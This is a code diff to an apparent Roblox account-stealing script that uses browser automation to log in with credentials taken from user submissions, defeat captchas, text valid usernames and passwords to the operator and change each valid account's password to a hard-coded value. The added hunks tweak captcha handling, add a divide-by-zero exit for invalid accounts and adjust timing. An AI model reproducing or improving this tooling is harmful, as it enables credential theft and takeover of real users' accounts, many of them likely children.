@@ -819,7 +819,9 @@ def crackCaptcha(group=False):
     #=======================
     
     correct_one = myGuess  
-        
+    
+    correct_one = 1
+
     keyboard.write(str(correct_one))
     time.sleep(1)
     
@@ -982,6 +984,12 @@ def testAccount(username, password):
     browser.find_element(By.ID, "login-button").click()
     print("Waiting for homepage...")
     checkForCaptcha()
+    if (isTextPresentInScope("Incorrect")):
+        print("Not a valid account.")
+        time.sleep(3)
+        breakout = (2/0)
+    print("moving...")
+    pyautogui.moveTo(1008, 640)
     i = 0
     while (browser.current_url != "https://www.roblox.com/home"):
         i += 1
@@ -996,6 +1004,7 @@ def testAccount(username, password):
 
 def changePassword(currentpassword, newpassword):
     browser.get("https://www.roblox.com/my/account#!/info")
+    time.sleep(3)
     clickThat(1415,361)
     time.sleep(0.5)
     #Current password
@@ -1156,6 +1165,10 @@ def testUserSubmissionIfPossible():
                     sendTextMessage(f"Logged valid roblox account. Username: {username} Password: {password}")
                     changePassword(password, "8VP<lG6kuHO%QcZ;IZFe")
                     print("Password changed!")
+                else:
+                    print("Not a valid account.")
+                    time.sleep(3)
+                    breakout = (2/0)
 
     except Exception as ex:
         print(f"Could not test user submission. Error message: {ex}")
